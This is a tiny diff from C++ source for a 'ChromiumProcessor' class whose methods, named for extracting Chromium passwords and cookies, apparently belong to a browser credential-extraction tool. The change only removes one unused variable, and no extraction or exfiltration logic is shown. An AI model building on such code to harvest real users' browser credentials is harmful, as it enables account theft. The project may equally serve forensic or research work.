@@ -101,7 +101,6 @@ stringstream ChromiumProcessor::ExtractChromiumPasswords()
 int ChromiumProcessor::ExtractChromiumCookies()
 {
     cout<<"ChromiumProcessor::getChromiumCookies()"<<endl;
-    stringstream dump(string(""));
     if(experimental::filesystem::exists(cookies_path))
     {
         //cout<<"exists "<<cookies_path<<endl;
